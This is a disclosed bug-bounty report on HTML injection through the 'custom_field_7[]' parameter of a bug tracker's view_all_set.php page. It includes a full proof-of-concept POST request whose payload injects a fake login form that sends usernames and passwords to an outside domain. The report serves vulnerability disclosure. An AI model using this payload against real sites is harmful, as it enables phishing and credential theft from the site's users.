# [bugs.fuzzing-project.org] HTML Injection via 'custom_field_7[]' parameter in '/view_all_set.php'

## Report Details
- **Report ID**: 903869
- **URL**: https://hackerone.com/reports/903869
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-06-20T16:11:52.864Z
- **Disclosed**: 2020-09-08T07:30:38.889Z

## Reporter
- **Username**: dragonjar
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: hannob

## Vulnerability Information
## Vulnerable Website URL or Application:

https://bugs.fuzzing-project.org/view_all_set.php?f=3

## Description of Security Issue:

By not properly cleaning the information entered in the `custom_field_7[]` field, an attacker could send emails to company customers, pointing to a legitimate fuzzing project domain where they are prompted for data, the possibility of successful phishing is excellent as the form is within the domain of the company.

## Please provide an exploit scenario for this vulnerability:

This could be a form where information is requested and sent to an external domain

{F876158}

```
POST /view_all_set.php?f=3 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Referer: https://bugs.fuzzing-project.org/
Cookie: MANTIS_secure_session=0;MANTIS_collapse_settings=|sidebar:1|filter:1;PHPSESSID=1495fp23866b0m12bi541et8c7
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Content-Length: 1947
Host: bugs.fuzzing-project.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: Keep-alive

category_id[]=0&custom_field_1[]=0&custom_field_2[]=0&custom_field_3[]=0&custom_field_4[]=0&custom_field_5[]=0&custom_field_6[]=0&custom_field_7[]=0'"()%26%25"'</td>--><div class="position-relative"><div class="signup-box visible widget-box no-border" id="login-box"><div class="widget-body"><div class="widget-main"><h4 class="header lighter bigger"><i class="ace-icon fa fa-sign-in"></i>Inicio de sesión</h4><div class="space-10"></div><form id="login-form" method="post" action="https://www.dragonjar.org"><fieldset><label for="username" class="block clearfix"><span class="block input-icon input-icon-right"><input id="username" name="username" type="text" placeholder="Nombre de usuario"   size="32" maxlength="191" value=""   class="form-control autofocus"><i class="ace-icon fa fa-user"></i></span></label><label for="password" class="block clearfix"><span class="block input-icon input-icon-right"><input id="password" name="password" type="password" placeholder="Contraseña" size="32" maxlength="1024" class="form-control autofocus"><i class="ace-icon fa fa-lock"></i></span></label><div class="space-10"></div><input type="submit" class="width-40 pull-right btn btn-success btn-inverse bigger-110" value="Iniciar sesión" /></fieldset></form></div><!--&dir[]=ASC&end_day=15&end_month=2&end_year=2020&filter=Use%20Filter&filter_by_date=0&filter_by_last_updated_date=0&handler_id[]=0&hide_status[]=-2&highlight_changed=6&last_updated_end_day=15&last_updated_end_month=2&last_updated_end_year=2020&last_updated_start_day=15&last_updated_start_month=2&last_updated_start_year=2020&match_type=0&monitor_user_id[]=0&note_user_id[]=0&os[]=0&os_build[]=0&per_page=50&platform[]=0&priority[]=0&profile_id[]=0&relationship_bug=0&relationship_type=-1&reporter_id[]=0&resolution[]=0&search=the&severity[]=0&sort[]=priority&start_day=15&start_month=2&start_year=2020&status[]=10&sticky=0&tag_select=0&tag_string=17&type=1&view_state=0&view_type=simple
```


## Steps needed to reproduce bug:

1. Open PoC.html ( {F876154} ) file in a web browser
2. check the webform

## Impact

An attacker could create a payload that, when visiting the site, without doing anything else (the site has a lot of traffic), could perform sensitive actions, such as reading private information, obtaining cookies those that are not marked as "httpOnly" or " isSecure ", including creating or modifying information within the platform since it does not have anti CSRF protection and we can force victims to generate requests on their behalf in the system with their privileges.

## Attachments
- PoC.htm
- HTML_Injection.jpg
